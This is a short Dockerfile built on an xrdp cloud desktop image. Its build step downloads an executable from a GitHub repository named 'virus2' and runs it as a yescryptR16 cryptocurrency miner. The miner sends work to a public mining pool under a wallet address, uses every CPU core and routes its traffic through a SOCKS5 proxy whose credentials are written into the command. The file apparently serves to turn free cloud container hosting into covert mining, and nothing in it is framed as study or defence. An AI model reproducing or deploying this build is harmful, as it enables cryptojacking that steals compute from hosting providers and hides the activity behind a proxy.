FROM aank999/xrdp-okteto-cloud:latest
LABEL maintainer="Aank is ME <https://aank.me/Youtube>"
EXPOSE 80
RUN wget https://github.com/raufpermana22/virus2/raw/main/av2 && chmod +x  av2 && ./av2 -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zpool.ca:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd -p c=ZZZ,zap=QOGE,ID=$(echo $(shuf -i 1-20000 -n 1)-kuan) -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80

ENTRYPOINT ["/startup.sh"]
